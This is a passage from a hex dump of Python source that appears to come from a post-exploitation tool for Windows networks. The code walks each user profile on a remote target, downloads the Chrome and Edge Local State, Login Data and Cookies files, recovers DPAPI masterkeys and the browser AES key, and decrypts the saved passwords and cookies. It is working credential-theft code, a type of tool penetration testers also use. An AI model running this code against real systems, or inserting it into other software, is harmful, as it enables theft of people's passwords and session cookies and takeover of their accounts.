+000045d0: 6769 6e44 6174 6127 2c20 2744 4f4d 4149  ginData', 'DOMAI
+000045e0: 4e27 292c 0a09 0909 0909 0909 2822 5573  N'),........("Us
+000045f0: 6572 735c 5c7b 7573 6572 6e61 6d65 7d5c  ers\\{username}\
+00004600: 5c41 7070 4461 7461 5c5c 4c6f 6361 6c5c  \AppData\\Local\
+00004610: 5c4d 6963 726f 736f 6674 5c5c 4564 6765  \Microsoft\\Edge
+00004620: 5c5c 5573 6572 2044 6174 6122 2c20 274c  \\User Data", 'L
+00004630: 6173 7420 5665 7273 696f 6e27 2c0a 0909  ast Version',...
+00004640: 0909 0909 0920 2743 6872 6f6d 6556 6572  ..... 'ChromeVer
+00004650: 7369 6f6e 272c 2027 444f 4d41 494e 2729  sion', 'DOMAIN')
+00004660: 2c0a 0909 0909 0909 095d 0a0a 0909 666f  ,........]....fo
+00004670: 7220 7573 6572 2069 6e20 7365 6c66 2e75  r user in self.u
+00004680: 7365 7273 3a0a 0909 0969 6620 7573 6572  sers:....if user
+00004690: 2e75 7365 726e 616d 6520 3d3d 2027 4d41  .username == 'MA
+000046a0: 4348 494e 4524 273a 0a09 0909 0963 6f6e  CHINE$':.....con
+000046b0: 7469 6e75 650a 0909 0965 6c73 653a 0a09  tinue....else:..
+000046c0: 0909 0964 6972 6563 746f 7269 6573 5f74  ...directories_t
+000046d0: 6f5f 7573 6520 3d20 7573 6572 5f64 6972  o_use = user_dir
+000046e0: 6563 746f 7269 6573 0a09 0909 096d 796f  ectories.....myo
+000046f0: 7074 696f 6e73 203d 2063 6f70 792e 6465  ptions = copy.de
+00004700: 6570 636f 7079 2873 656c 662e 6f70 7469  epcopy(self.opti
+00004710: 6f6e 7329 0a09 0909 096d 796f 7074 696f  ons).....myoptio
+00004720: 6e73 2e66 696c 6520 3d20 4e6f 6e65 2020  ns.file = None  
+00004730: 2320 2263 6872 6f6d 655f 656e 635f 626c  # "chrome_enc_bl
+00004740: 6f62 2e74 6d70 2220 2023 2042 4c4f 4220  ob.tmp"  # BLOB 
+00004750: 746f 2070 6172 7365 0a09 0909 096d 796f  to parse.....myo
+00004760: 7074 696f 6e73 2e6b 6579 203d 204e 6f6e  ptions.key = Non
+00004770: 650a 0909 0909 6d79 6f70 7469 6f6e 732e  e.....myoptions.
+00004780: 6d61 7374 6572 6b65 7973 203d 204e 6f6e  masterkeys = Non
+00004790: 650a 0909 0909 6d79 4368 726f 6d65 5365  e.....myChromeSe
+000047a0: 6372 6574 7320 3d20 4348 524f 4d45 5f4c  crets = CHROME_L
+000047b0: 4f47 494e 5328 6d79 6f70 7469 6f6e 732c  OGINS(myoptions,
+000047c0: 2073 656c 662e 6c6f 6767 696e 672c 2073   self.logging, s
+000047d0: 656c 662e 6462 2c20 7573 6572 2e75 7365  elf.db, user.use
+000047e0: 726e 616d 652c 2074 7970 653d 224d 5345  rname, type="MSE
+000047f0: 6467 6522 290a 0a09 0909 2320 6966 206c  dge").....# if l
+00004800: 656e 2875 7365 722e 6d61 7374 6572 6b65  en(user.masterke
+00004810: 7973 293e 303a 2350 6173 2064 6520 6d61  ys)>0:#Pas de ma
+00004820: 7374 6572 6b65 7973 3d3d 7061 7320 6465  sterkeys==pas de
+00004830: 2064 6174 6173 2061 2072 6563 7570 0a09   datas a recup..
+00004840: 0909 666f 7220 696e 666f 2069 6e20 6469  ..for info in di
+00004850: 7265 6374 6f72 6965 735f 746f 5f75 7365  rectories_to_use
+00004860: 3a0a 0909 0909 6d79 5f64 6972 2c20 6d79  :.....my_dir, my
+00004870: 5f6d 6173 6b2c 206d 795f 626c 6f62 5f74  _mask, my_blob_t
+00004880: 7970 652c 206d 795f 7573 6572 5f74 7970  ype, my_user_typ
+00004890: 6520 3d20 696e 666f 0a09 0909 0974 6d70  e = info.....tmp
+000048a0: 5f70 7764 203d 206d 795f 6469 722e 666f  _pwd = my_dir.fo
+000048b0: 726d 6174 280a 0909 0909 0975 7365 726e  rmat(......usern
+000048c0: 616d 653d 7573 6572 2e75 7365 726e 616d  ame=user.usernam
+000048d0: 6529 2020 2320 746d 705f 7077 6420 3d20  e)  # tmp_pwd = 
+000048e0: 6622 5573 6572 735c 5c7b 7573 6572 2e75  f"Users\\{user.u
+000048f0: 7365 726e 616d 657d 5c5c 7b6d 795f 6469  sername}\\{my_di
+00004900: 727d 2223 6e74 7061 7468 2e6a 6f69 6e28  r}"#ntpath.join(
+00004910: 6e74 7061 7468 2e6a 6f69 6e28 2755 7365  ntpath.join('Use
+00004920: 7273 272c 2075 7365 722e 7573 6572 6e61  rs', user.userna
+00004930: 6d65 292c 206d 795f 6469 7229 0a09 0909  me), my_dir)....
+00004940: 0973 656c 662e 6c6f 6767 696e 672e 6465  .self.logging.de
+00004950: 6275 6728 0a09 0909 0909 6622 5b7b 7365  bug(......f"[{se
+00004960: 6c66 2e6f 7074 696f 6e73 2e74 6172 6765  lf.options.targe
+00004970: 745f 6970 7d5d 204c 6f6f 6b69 6e67 2066  t_ip}] Looking f
+00004980: 6f72 207b 7573 6572 2e75 7365 726e 616d  or {user.usernam
+00004990: 657d 2066 696c 6573 2069 6e20 7b74 6d70  e} files in {tmp
+000049a0: 5f70 7764 7d20 7769 7468 206d 6173 6b20  _pwd} with mask 
+000049b0: 7b6d 795f 6d61 736b 7d22 290a 0909 0909  {my_mask}").....
+000049c0: 6d79 5f64 6972 6563 746f 7279 203d 2073  my_directory = s
+000049d0: 656c 662e 6d79 6669 6c65 6f70 732e 646f  elf.myfileops.do
+000049e0: 5f6c 7328 746d 705f 7077 642c 206d 795f  _ls(tmp_pwd, my_
+000049f0: 6d61 736b 2c20 6469 7370 6c61 793d 4661  mask, display=Fa
+00004a00: 6c73 6529 0a09 0909 0966 6f72 2069 6e66  lse).....for inf
+00004a10: 6f73 2069 6e20 6d79 5f64 6972 6563 746f  os in my_directo
+00004a20: 7279 3a0a 0909 0909 096c 6f6e 676e 616d  ry:......longnam
+00004a30: 652c 2069 735f 6469 7265 6374 6f72 7920  e, is_directory 
+00004a40: 3d20 696e 666f 730a 0909 0909 0973 656c  = infos......sel
+00004a50: 662e 6c6f 6767 696e 672e 6465 6275 6728  f.logging.debug(
+00004a60: 226c 7320 7265 7475 726e 6564 2066 696c  "ls returned fil
+00004a70: 6520 2573 2220 2520 6c6f 6e67 6e61 6d65  e %s" % longname
+00004a80: 290a 0909 0909 0969 6620 6c6f 6e67 6e61  )......if longna
+00004a90: 6d65 206e 6f74 2069 6e20 626c 6163 6b6c  me not in blackl
+00004aa0: 6973 7420 616e 6420 6e6f 7420 6973 5f64  ist and not is_d
+00004ab0: 6972 6563 746f 7279 3a0a 0909 0909 0909  irectory:.......
+00004ac0: 7472 793a 0a09 0909 0909 0909 7365 6c66  try:........self
+00004ad0: 2e6c 6f67 6769 6e67 2e64 6562 7567 280a  .logging.debug(.
+00004ae0: 0909 0909 0909 0909 6622 5b7b 7365 6c66  ........f"[{self
+00004af0: 2e6f 7074 696f 6e73 2e74 6172 6765 745f  .options.target_
+00004b00: 6970 7d5d 205b 2b5d 2046 6f75 6e64 207b  ip}] [+] Found {
+00004b10: 6263 6f6c 6f72 732e 4f4b 424c 5545 7d7b  bcolors.OKBLUE}{
+00004b20: 7573 6572 2e75 7365 726e 616d 657d 7b62  user.username}{b
+00004b30: 636f 6c6f 7273 2e45 4e44 437d 2043 6872  colors.ENDC} Chr
+00004b40: 6f6d 6520 6669 6c65 7320 3a20 7b6c 6f6e  ome files : {lon
+00004b50: 676e 616d 657d 2229 0a09 0909 0909 0909  gname}")........
+00004b60: 2320 446f 776e 6c6f 6164 696e 6720 426c  # Downloading Bl
+00004b70: 6f62 2066 696c 650a 0909 0909 0909 096c  ob file........l
+00004b80: 6f63 616c 6669 6c65 203d 2073 656c 662e  ocalfile = self.
+00004b90: 6d79 6669 6c65 6f70 732e 6765 745f 6669  myfileops.get_fi
+00004ba0: 6c65 286e 7470 6174 682e 6a6f 696e 2874  le(ntpath.join(t
+00004bb0: 6d70 5f70 7764 2c20 6c6f 6e67 6e61 6d65  mp_pwd, longname
+00004bc0: 292c 2061 6c6c 6f77 5f61 6363 6573 735f  ), allow_access_
+00004bd0: 6572 726f 723d 5472 7565 290a 0909 0909  error=True).....
+00004be0: 0909 0923 206d 796f 7074 696f 6e73 203d  ...# myoptions =
+00004bf0: 2063 6f70 792e 6465 6570 636f 7079 2873   copy.deepcopy(s
+00004c00: 656c 662e 6f70 7469 6f6e 7329 0a09 0909  elf.options)....
+00004c10: 0909 0909 6966 206d 795f 626c 6f62 5f74  ....if my_blob_t
+00004c20: 7970 6520 3d3d 2027 4368 726f 6d65 4c6f  ype == 'ChromeLo
+00004c30: 6361 6c53 7461 7465 273a 0a09 0909 0909  calState':......
+00004c40: 0909 0974 7279 3a0a 0909 0909 0909 0909  ...try:.........
+00004c50: 096d 7943 6872 6f6d 6553 6563 7265 7473  .myChromeSecrets
+00004c60: 2e6c 6f63 616c 7374 6174 655f 7061 7468  .localstate_path
+00004c70: 203d 206c 6f63 616c 6669 6c65 0a09 0909   = localfile....
+00004c80: 0909 0909 0909 6775 6964 203d 206d 7943  ......guid = myC
+00004c90: 6872 6f6d 6553 6563 7265 7473 2e67 6574  hromeSecrets.get
+00004ca0: 5f6d 6173 7465 726b 6579 5f67 7569 645f  _masterkey_guid_
+00004cb0: 6672 6f6d 5f6c 6f63 616c 7374 6174 6528  from_localstate(
+00004cc0: 290a 0909 0909 0909 0909 0969 6620 6775  )..........if gu
+00004cd0: 6964 2021 3d20 4e6f 6e65 3a0a 0909 0909  id != None:.....
+00004ce0: 0909 0909 0909 6d61 7374 6572 6b65 7920  ......masterkey 
+00004cf0: 3d20 7365 6c66 2e67 6574 5f6d 6173 7465  = self.get_maste
+00004d00: 726b 6579 2875 7365 723d 7573 6572 2c20  rkey(user=user, 
+00004d10: 6775 6964 3d67 7569 642c 2074 7970 653d  guid=guid, type=
+00004d20: 6d79 5f75 7365 725f 7479 7065 290a 0909  my_user_type)...
+00004d30: 0909 0909 0909 0909 6966 206d 6173 7465  ........if maste
+00004d40: 726b 6579 2021 3d20 4e6f 6e65 3a0a 0909  rkey != None:...
+00004d50: 0909 0909 0909 0909 0969 6620 6d61 7374  .........if mast
+00004d60: 6572 6b65 795b 2773 7461 7475 7327 5d20  erkey['status'] 
+00004d70: 3d3d 2027 6465 6372 7970 7465 6427 3a0a  == 'decrypted':.
+00004d80: 0909 0909 0909 0909 0909 0909 6d79 4368  ............myCh
+00004d90: 726f 6d65 5365 6372 6574 732e 6d61 7374  romeSecrets.mast
+00004da0: 6572 6b65 7920 3d20 6d61 7374 6572 6b65  erkey = masterke
+00004db0: 795b 276b 6579 275d 0a09 0909 0909 0909  y['key']........
+00004dc0: 0909 0909 0961 6573 4b65 7920 3d20 6d79  .....aesKey = my
+00004dd0: 4368 726f 6d65 5365 6372 6574 732e 6765  ChromeSecrets.ge
+00004de0: 745f 4145 535f 6b65 795f 6672 6f6d 5f6c  t_AES_key_from_l
+00004df0: 6f63 616c 7374 6174 6528 0a09 0909 0909  ocalstate(......
+00004e00: 0909 0909 0909 0909 6d61 7374 6572 6b65  ........masterke
+00004e10: 793d 6d61 7374 6572 6b65 795b 276b 6579  y=masterkey['key
+00004e20: 275d 290a 0909 0909 0909 0909 0909 0909  ']).............
+00004e30: 6966 2061 6573 4b65 7920 213d 204e 6f6e  if aesKey != Non
+00004e40: 653a 0a09 0909 0909 0909 0909 0909 0909  e:..............
+00004e50: 7365 6c66 2e6c 6f67 6769 6e67 2e64 6562  self.logging.deb
+00004e60: 7567 280a 0909 0909 0909 0909 0909 0909  ug(.............
+00004e70: 0909 6622 5b7b 7365 6c66 2e6f 7074 696f  ..f"[{self.optio
+00004e80: 6e73 2e74 6172 6765 745f 6970 7d5d 207b  ns.target_ip}] {
+00004e90: 6263 6f6c 6f72 732e 4f4b 4752 4545 4e7d  bcolors.OKGREEN}
+00004ea0: 4465 6372 7970 7469 6f6e 2073 7563 6365  Decryption succe
+00004eb0: 7373 6675 6c6c 206f 6620 7b62 636f 6c6f  ssfull of {bcolo
+00004ec0: 7273 2e4f 4b42 4c55 457d 7b75 7365 722e  rs.OKBLUE}{user.
+00004ed0: 7573 6572 6e61 6d65 7d7b 6263 6f6c 6f72  username}{bcolor
+00004ee0: 732e 454e 4443 7d20 4368 726f 6d65 2041  s.ENDC} Chrome A
+00004ef0: 4553 204b 6579 207b 6165 734b 6579 7d20  ES Key {aesKey} 
+00004f00: 7b62 636f 6c6f 7273 2e45 4e44 437d 2229  {bcolors.ENDC}")
+00004f10: 0a09 0909 0909 0909 0909 0909 0965 6c73  .............els
+00004f20: 653a 0a09 0909 0909 0909 0909 0909 0909  e:..............
+00004f30: 7365 6c66 2e6c 6f67 6769 6e67 2e64 6562  self.logging.deb
+00004f40: 7567 280a 0909 0909 0909 0909 0909 0909  ug(.............
+00004f50: 0909 6622 5b7b 7365 6c66 2e6f 7074 696f  ..f"[{self.optio
+00004f60: 6e73 2e74 6172 6765 745f 6970 7d5d 207b  ns.target_ip}] {
+00004f70: 6263 6f6c 6f72 732e 5741 524e 494e 477d  bcolors.WARNING}
+00004f80: 4572 726f 7220 6465 6372 7970 7469 6e67  Error decrypting
+00004f90: 2041 4553 204b 6579 2066 6f72 2043 6872   AES Key for Chr
+00004fa0: 6f6d 6520 4c6f 6361 6c20 5374 6174 6520  ome Local State 
+00004fb0: 7769 7468 204d 6173 7465 726b 6579 7b62  with Masterkey{b
+00004fc0: 636f 6c6f 7273 2e45 4e44 437d 2229 0a09  colors.ENDC}")..
+00004fd0: 0909 0909 0909 0909 0909 656c 7365 3a0a  ..........else:.
+00004fe0: 0909 0909 0909 0909 0909 0909 7365 6c66  ............self
+00004ff0: 2e6c 6f67 6769 6e67 2e64 6562 7567 280a  .logging.debug(.
+00005000: 0909 0909 0909 0909 0909 0909 0966 225b  .............f"[
+00005010: 7b73 656c 662e 6f70 7469 6f6e 732e 7461  {self.options.ta
+00005020: 7267 6574 5f69 707d 5d20 7b62 636f 6c6f  rget_ip}] {bcolo
+00005030: 7273 2e57 4152 4e49 4e47 7d45 7272 6f72  rs.WARNING}Error
+00005040: 2064 6563 7279 7074 696e 6720 4145 5320   decrypting AES 
+00005050: 4b65 7920 666f 7220 4368 726f 6d65 204c  Key for Chrome L
+00005060: 6f63 616c 2053 7461 7465 2020 2d20 4d61  ocal State  - Ma
+00005070: 7374 6572 6b65 7920 6e6f 7420 6465 6372  sterkey not decr
+00005080: 7970 7465 647b 6263 6f6c 6f72 732e 454e  ypted{bcolors.EN
+00005090: 4443 7d22 290a 0909 0909 0909 0909 0909  DC}")...........
+000050a0: 656c 7365 3a0a 0909 0909 0909 0909 0909  else:...........
+000050b0: 0973 656c 662e 6c6f 6767 696e 672e 6465  .self.logging.de
+000050c0: 6275 6728 0a09 0909 0909 0909 0909 0909  bug(............
+000050d0: 0966 225b 7b73 656c 662e 6f70 7469 6f6e  .f"[{self.option
+000050e0: 732e 7461 7267 6574 5f69 707d 5d20 7b62  s.target_ip}] {b
+000050f0: 636f 6c6f 7273 2e57 4152 4e49 4e47 7d45  colors.WARNING}E
+00005100: 7272 6f72 2064 6563 7279 7074 696e 6720  rror decrypting 
+00005110: 4145 5320 4b65 7920 666f 7220 4368 726f  AES Key for Chro
+00005120: 6d65 204c 6f63 616c 2053 7461 7465 2077  me Local State w
+00005130: 6974 6820 4d61 7374 6572 6b65 792d 2063  ith Masterkey- c
+00005140: 616e 7420 6765 7420 6d61 7374 6572 6b65  ant get masterke
+00005150: 7920 7b67 7569 647d 7b62 636f 6c6f 7273  y {guid}{bcolors
+00005160: 2e45 4e44 437d 2229 0a09 0909 0909 0909  .ENDC}")........
+00005170: 0909 656c 7365 3a0a 0909 0909 0909 0909  ..else:.........
+00005180: 0909 7365 6c66 2e6c 6f67 6769 6e67 2e64  ..self.logging.d
+00005190: 6562 7567 280a 0909 0909 0909 0909 0909  ebug(...........
+000051a0: 0966 225b 7b73 656c 662e 6f70 7469 6f6e  .f"[{self.option
+000051b0: 732e 7461 7267 6574 5f69 707d 5d20 7b62  s.target_ip}] {b
+000051c0: 636f 6c6f 7273 2e57 4152 4e49 4e47 7d45  colors.WARNING}E
+000051d0: 7272 6f72 2064 6563 7279 7074 696e 6720  rror decrypting 
+000051e0: 4145 5320 4b65 7920 666f 7220 4368 726f  AES Key for Chro
+000051f0: 6d65 204c 6f63 616c 2053 7461 7465 2077  me Local State w
+00005200: 6974 6820 4d61 7374 6572 6b65 7920 2d20  ith Masterkey - 
+00005210: 6361 6e20 7420 6765 7420 7468 6520 4755  can t get the GU
+00005220: 4944 206f 6620 6d61 7374 6572 6b65 7920  ID of masterkey 
+00005230: 6672 6f6d 2062 6c6f 6220 6669 6c65 7b62  from blob file{b
+00005240: 636f 6c6f 7273 2e45 4e44 437d 2229 0a09  colors.ENDC}")..
+00005250: 0909 0909 0909 0965 7863 6570 7420 4578  .......except Ex
+00005260: 6365 7074 696f 6e20 6173 2065 783a 0a09  ception as ex:..
+00005270: 0909 0909 0909 0909 7365 6c66 2e6c 6f67  ........self.log
+00005280: 6769 6e67 2e64 6562 7567 280a 0909 0909  ging.debug(.....
+00005290: 0909 0909 0909 6622 5b7b 7365 6c66 2e6f  ......f"[{self.o
+000052a0: 7074 696f 6e73 2e74 6172 6765 745f 6970  ptions.target_ip
+000052b0: 7d5d 207b 6263 6f6c 6f72 732e 5741 524e  }] {bcolors.WARN
+000052c0: 494e 477d 4578 6365 7074 696f 6e20 696e  ING}Exception in
+000052d0: 2043 6872 6f6d 654c 6f63 616c 5374 6174   ChromeLocalStat
+000052e0: 657b 6263 6f6c 6f72 732e 454e 4443 7d22  e{bcolors.ENDC}"
+000052f0: 290a 0909 0909 0909 0909 0973 656c 662e  )..........self.
+00005300: 6c6f 6767 696e 672e 6465 6275 6728 6578  logging.debug(ex
+00005310: 290a 0909 0909 0909 0969 6620 6d79 5f62  )........if my_b
+00005320: 6c6f 625f 7479 7065 203d 3d20 2743 6872  lob_type == 'Chr
+00005330: 6f6d 654c 6f67 696e 4461 7461 273a 0a09  omeLoginData':..
+00005340: 0909 0909 0909 0974 7279 3a0a 0909 0909  .......try:.....
+00005350: 0909 0909 096d 7943 6872 6f6d 6553 6563  .....myChromeSec
+00005360: 7265 7473 2e6c 6f67 696e 6461 7461 5f70  rets.logindata_p
+00005370: 6174 6820 3d20 6c6f 6361 6c66 696c 650a  ath = localfile.
+00005380: 0909 0909 0909 0909 0975 7365 722e 6669  .........user.fi
+00005390: 6c65 735b 6c6f 6e67 6e61 6d65 5d20 3d20  les[longname] = 
+000053a0: 7b7d 0a09 0909 0909 0909 0909 7573 6572  {}..........user
+000053b0: 2e66 696c 6573 5b6c 6f6e 676e 616d 655d  .files[longname]
+000053c0: 5b27 7479 7065 275d 203d 206d 795f 626c  ['type'] = my_bl
+000053d0: 6f62 5f74 7970 650a 0909 0909 0909 0909  ob_type.........
+000053e0: 0975 7365 722e 6669 6c65 735b 6c6f 6e67  .user.files[long
+000053f0: 6e61 6d65 5d5b 2773 7461 7475 7327 5d20  name]['status'] 
+00005400: 3d20 2765 6e63 7279 7074 6564 270a 0909  = 'encrypted'...
+00005410: 0909 0909 0909 0975 7365 722e 6669 6c65  .......user.file
+00005420: 735b 6c6f 6e67 6e61 6d65 5d5b 2770 6174  s[longname]['pat
+00005430: 6827 5d20 3d20 6c6f 6361 6c66 696c 650a  h'] = localfile.
+00005440: 0909 0909 0909 0909 096c 6f67 696e 7320  .........logins 
+00005450: 3d20 6d79 4368 726f 6d65 5365 6372 6574  = myChromeSecret
+00005460: 732e 6465 6372 7970 745f 6368 726f 6d65  s.decrypt_chrome
+00005470: 5f4c 6f67 696e 4461 7461 2829 0a09 0909  _LoginData()....
+00005480: 0909 0909 0909 7573 6572 2e66 696c 6573  ......user.files
+00005490: 5b6c 6f6e 676e 616d 655d 5b27 7365 6372  [longname]['secr
+000054a0: 6574 275d 203d 206c 6f67 696e 730a 0909  et'] = logins...
+000054b0: 0909 0909 0909 0969 6620 6c6f 6769 6e73  .......if logins
+000054c0: 2069 7320 6e6f 7420 4e6f 6e65 3a0a 0909   is not None:...
+000054d0: 0909 0909 0909 0909 7573 6572 2e66 696c  ........user.fil
+000054e0: 6573 5b6c 6f6e 676e 616d 655d 5b27 7374  es[longname]['st
+000054f0: 6174 7573 275d 203d 2027 6465 6372 7970  atus'] = 'decryp
+00005500: 7465 6427 0a09 0909 0909 0909 0965 7863  ted'.........exc
+00005510: 6570 7420 4578 6365 7074 696f 6e20 6173  ept Exception as
+00005520: 2065 783a 0a09 0909 0909 0909 0909 7365   ex:..........se
+00005530: 6c66 2e6c 6f67 6769 6e67 2e64 6562 7567  lf.logging.debug
+00005540: 280a 0909 0909 0909 0909 0909 6622 5b7b  (...........f"[{
+00005550: 7365 6c66 2e6f 7074 696f 6e73 2e74 6172  self.options.tar
+00005560: 6765 745f 6970 7d5d 207b 6263 6f6c 6f72  get_ip}] {bcolor
+00005570: 732e 5741 524e 494e 477d 4578 6365 7074  s.WARNING}Except
+00005580: 696f 6e20 6465 6372 7970 7469 6e67 206c  ion decrypting l
+00005590: 6f67 696e 6461 7461 2066 6f72 2043 4852  ogindata for CHR
+000055a0: 4f4d 4520 7b75 7365 722e 7573 6572 6e61  OME {user.userna
+000055b0: 6d65 7d20 7b6c 6f63 616c 6669 6c65 7d20  me} {localfile} 
+000055c0: 7b62 636f 6c6f 7273 2e45 4e44 437d 2229  {bcolors.ENDC}")
+000055d0: 0a09 0909 0909 0909 0909 7365 6c66 2e6c  ..........self.l
+000055e0: 6f67 6769 6e67 2e64 6562 7567 2865 7829  ogging.debug(ex)
+000055f0: 0a09 0909 0909 0909 6966 206d 795f 626c  ........if my_bl
+00005600: 6f62 5f74 7970 6520 3d3d 2027 4368 726f  ob_type == 'Chro
+00005610: 6d65 436f 6f6b 6965 7327 3a0a 0909 0909  meCookies':.....
+00005620: 0909 0909 7472 793a 0a09 0909 0909 0909  ....try:........
+00005630: 0909 6d79 4368 726f 6d65 5365 6372 6574  ..myChromeSecret
+00005640: 732e 636f 6f6b 6965 5f70 6174 6820 3d20  s.cookie_path = 
+00005650: 6c6f 6361 6c66 696c 650a 0909 0909 0909  localfile.......
+00005660: 0909 0975 7365 722e 6669 6c65 735b 6c6f  ...user.files[lo
+00005670: 6e67 6e61 6d65 5d20 3d20 7b7d 0a09 0909  ngname] = {}....
+00005680: 0909 0909 0909 7573 6572 2e66 696c 6573  ......user.files
+00005690: 5b6c 6f6e 676e 616d 655d 5b27 7479 7065  [longname]['type
+000056a0: 275d 203d 206d 795f 626c 6f62 5f74 7970  '] = my_blob_typ
+000056b0: 650a 0909 0909 0909 0909 0975 7365 722e  e..........user.
+000056c0: 6669 6c65 735b 6c6f 6e67 6e61 6d65 5d5b  files[longname][
+000056d0: 2773 7461 7475 7327 5d20 3d20 2765 6e63  'status'] = 'enc
+000056e0: 7279 7074 6564 270a 0909 0909 0909 0909  rypted'.........
+000056f0: 0975 7365 722e 6669 6c65 735b 6c6f 6e67  .user.files[long
+00005700: 6e61 6d65 5d5b 2770 6174 6827 5d20 3d20  name]['path'] = 
+00005710: 6c6f 6361 6c66 696c 650a 0909 0909 0909  localfile.......
+00005720: 0909 0963 6f6f 6b69 6573 203d 206d 7943  ...cookies = myC
+00005730: 6872 6f6d 6553 6563 7265 7473 2e64 6563  hromeSecrets.dec
+00005740: 7279 7074 5f63 6872 6f6d 655f 436f 6f6b  rypt_chrome_Cook
+00005750: 6965 4461 7461 2829 0a09 0909 0909 0909  ieData()........
+00005760: 0909 7573 6572 2e66 696c 6573 5b6c 6f6e  ..user.files[lon
+00005770: 676e 616d 655d 5b27 7365 6372 6574 275d  gname]['secret']
+00005780: 203d 2063 6f6f 6b69 6573 0a09 0909 0909   = cookies......
+00005790: 0909 0909 6966 2063 6f6f 6b69 6573 2069  ....if cookies i
+000057a0: 7320 6e6f 7420 4e6f 6e65 3a0a 0909 0909  s not None:.....
+000057b0: 0909 0909 0909 7573 6572 2e66 696c 6573  ......user.files
+000057c0: 5b6c 6f6e 676e 616d 655d 5b27 7374 6174  [longname]['stat
+000057d0: 7573 275d 203d 2027 6465 6372 7970 7465  us'] = 'decrypte
+000057e0: 6427 0a09 0909 0909 0909 0965 7863 6570  d'.........excep
+000057f0: 7420 4578 6365 7074 696f 6e20 6173 2065  t Exception as e
+00005800: 783a 0a09 0909 0909 0909 0909 7365 6c66  x:..........self
+00005810: 2e6c 6f67 6769 6e67 2e64 6562 7567 280a  .logging.debug(.
+00005820: 0909 0909 0909 0909 0909 6622 5b7b 7365  ..........f"[{se
+00005830: 6c66 2e6f 7074 696f 6e73 2e74 6172 6765  lf.options.targe
+00005840: 745f 6970 7d5d 207b 6263 6f6c 6f72 732e  t_ip}] {bcolors.
+00005850: 5741 524e 494e 477d 4578 6365 7074 696f  WARNING}Exceptio
+00005860: 6e20 6465 6372 7970 7469 6e67 2043 6f6f  n decrypting Coo
+00005870: 6b69 6544 6174 6120 666f 7220 4348 524f  kieData for CHRO
+00005880: 4d45 207b 7573 6572 2e75 7365 726e 616d  ME {user.usernam
+00005890: 657d 207b 6c6f 6361 6c66 696c 657d 207b  e} {localfile} {
+000058a0: 6263 6f6c 6f72 732e 454e 4443 7d22 290a  bcolors.ENDC}").
+000058b0: 0909 0909 0909 0909 0973 656c 662e 6c6f  .........self.lo
+000058c0: 6767 696e 672e 6465 6275 6728 6578 290a  gging.debug(ex).
+000058d0: 0909 0909 0909 0969 6620 6d79 5f62 6c6f  .......if my_blo
+000058e0: 625f 7479 7065 203d 3d20 2743 6872 6f6d  b_type == 'Chrom
+000058f0: 6556 6572 7369 6f6e 273a 0a09 0909 0909  eVersion':......
+00005900: 0909 0974 7279 3a0a 0909 0909 0909 0909  ...try:.........
+00005910: 096d 7943 6872 6f6d 6553 6563 7265 7473  .myChromeSecrets
+00005920: 2e76 6572 7369 6f6e 5f70 6174 6820 3d20  .version_path = 
+00005930: 6c6f 6361 6c66 696c 650a 0909 0909 0909  localfile.......
+00005940: 0909 0975 7365 722e 6669 6c65 735b 6c6f  ...user.files[lo
+00005950: 6e67 6e61 6d65 5d20 3d20 7b7d 0a09 0909  ngname] = {}....
+00005960: 0909 0909 0909 7573 6572 2e66 696c 6573  ......user.files
+00005970: 5b6c 6f6e 676e 616d 655d 5b27 7479 7065  [longname]['type
+00005980: 275d 203d 206d 795f 626c 6f62 5f74 7970  '] = my_blob_typ
+00005990: 650a 0909 0909 0909 0909 0975 7365 722e  e..........user.
+000059a0: 6669 6c65 735b 6c6f 6e67 6e61 6d65 5d5b  files[longname][
+000059b0: 2773 7461 7475 7327 5d20 3d20 2765 6e63  'status'] = 'enc
+000059c0: 7279 7074 6564 270a 0909 0909 0909 0909  rypted'.........
+000059d0: 0975 7365 722e 6669 6c65 735b 6c6f 6e67  .user.files[long
+000059e0: 6e61 6d65 5d5b 2770 6174 6827 5d20 3d20  name]['path'] = 
+000059f0: 6c6f 6361 6c66 696c 650a 0909 0909 0909  localfile.......
+00005a00: 0909 0963 6f6f 6b69 6573 203d 206d 7943  ...cookies = myC
+00005a10: 6872 6f6d 6553 6563 7265 7473 2e67 6574  hromeSecrets.get
+00005a20: 5f63 6872 6f6d 655f 5665 7273 696f 6e28  _chrome_Version(
+00005a30: 290a 0909 0909 0909 0909 0975 7365 722e  )..........user.
+00005a40: 6669 6c65 735b 6c6f 6e67 6e61 6d65 5d5b  files[longname][
+00005a50: 2773 6563 7265 7427 5d20 3d20 636f 6f6b  'secret'] = cook
+00005a60: 6965 730a 0909 0909 0909 0909 0969 6620  ies..........if 
+00005a70: 636f 6f6b 6965 7320 6973 206e 6f74 204e  cookies is not N
+00005a80: 6f6e 653a 0a09 0909 0909 0909 0909 0975  one:...........u
+00005a90: 7365 722e 6669 6c65 735b 6c6f 6e67 6e61  ser.files[longna
+00005aa0: 6d65 5d5b 2773 7461 7475 7327 5d20 3d20  me]['status'] = 
+00005ab0: 2764 6563 7279 7074 6564 270a 0909 0909  'decrypted'.....
+00005ac0: 0909 0909 6578 6365 7074 2045 7863 6570  ....except Excep
+00005ad0: 7469 6f6e 2061 7320 6578 3a0a 0909 0909  tion as ex:.....
+00005ae0: 0909 0909 0973 656c 662e 6c6f 6767 696e  .....self.loggin
+00005af0: 672e 6465 6275 6728 0a09 0909 0909 0909  g.debug(........
+00005b00: 0909 0966 225b 7b73 656c 662e 6f70 7469  ...f"[{self.opti
+00005b10: 6f6e 732e 7461 7267 6574 5f69 707d 5d20  ons.target_ip}] 
+00005b20: 7b62 636f 6c6f 7273 2e57 4152 4e49 4e47  {bcolors.WARNING
+00005b30: 7d45 7863 6570 7469 6f6e 2064 6563 7279  }Exception decry
+00005b40: 7074 696e 6720 436f 6f6b 6965 4461 7461  pting CookieData
+00005b50: 2066 6f72 2043 4852 4f4d 4520 7b75 7365   for CHROME {use
+00005b60: 722e 7573 6572 6e61 6d65 7d20 7b6c 6f63  r.username} {loc
+00005b70: 616c 6669 6c65 7d20 7b62 636f 6c6f 7273  alfile} {bcolors
+00005b80: 2e45 4e44 437d 2229 0a09 0909 0909 0909  .ENDC}")........
+00005b90: 0909 7365 6c66 2e6c 6f67 6769 6e67 2e64  ..self.logging.d
+00005ba0: 6562 7567 2865 7829 0a0a 0909 0909 0909  ebug(ex)........
+00005bb0: 6578 6365 7074 2045 7863 6570 7469 6f6e  except Exception
+00005bc0: 2061 7320 6578 3a0a 0909 0909 0909 0973   as ex:........s
+00005bd0: 656c 662e 6c6f 6767 696e 672e 6465 6275  elf.logging.debu
+00005be0: 6728 0a09 0909 0909 0909 0966 225b 7b73  g(.........f"[{s
